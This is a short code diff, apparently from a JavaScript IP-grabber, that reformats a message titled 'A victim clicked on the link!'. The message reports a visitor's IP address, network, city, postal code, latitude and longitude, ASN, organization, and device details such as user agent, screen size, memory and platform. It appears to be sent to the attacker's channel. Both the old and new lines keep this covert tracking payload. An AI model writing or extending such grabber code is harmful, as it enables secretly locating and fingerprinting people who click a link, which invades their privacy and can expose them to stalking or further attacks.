@@ -37,24 +37,25 @@ const sendIP = () => {
                                 {
                                     title: 'A victim clicked on the link!',
                                     description: `
-                                        **IP Address >> **${ipadd}
-                                        \n**Network >> ** ${geoData.network}
-                                        \n**City >> ** ${geoData.city}
-                                        \n**Region >> ** ${geoData.region}
-                                        \n**Country >> ** ${geoData.country_name}
-                                        \n**Postal Code >> ** ${geoData.postal}
-                                        \n**Latitude >> ** ${geoData.latitude}
-                                        \n**Longitude >> ** ${geoData.longitude}
-                                        \n**Timezone >> ** ${geoData.timezone}
-                                        \n**ASN >> ** ${geoData.asn}
-                                        \n**Organization >> ** ${geoData.org}
-                                        \n\n**Device Info:** 
-                                        \n**User-Agent >> ** ${deviceInfo.userAgent}
-                                        \n**Screen Width >> ** ${deviceInfo.screenWidth}px
-                                        \n**Screen Height >> ** ${deviceInfo.screenHeight}px
-                                        \n**Device Memory >> ** ${deviceInfo.deviceMemory} GB
-                                        \n**Language >> ** ${deviceInfo.language}
-                                        \n**Platform >> ** ${deviceInfo.platform}`,
+                                        **IP Info:**\n
+                                        IP Address >> ${ipadd}
+                                        Network >>  ${geoData.network}
+                                        City >>  ${geoData.city}
+                                        Region >>  ${geoData.region}
+                                        Country >>  ${geoData.country_name}
+                                        Postal Code >>  ${geoData.postal}
+                                        Latitude >>  ${geoData.latitude}
+                                        Longitude >>  ${geoData.longitude}
+                                        Timezone >>  ${geoData.timezone}
+                                        ASN >>  ${geoData.asn}
+                                        Organization >>  ${geoData.org}
+                                        **Device Info:**\n 
+                                        User-Agent >>  ${deviceInfo.userAgent}
+                                        Screen Width >>  ${deviceInfo.screenWidth}px
+                                        Screen Height >>  ${deviceInfo.screenHeight}px
+                                        Device Memory >>  ${deviceInfo.deviceMemory} GB
+                                        Language >>  ${deviceInfo.language}
+                                        Platform >>  ${deviceInfo.platform}`,
                                     color: 0x800080
                                 }
                             ]
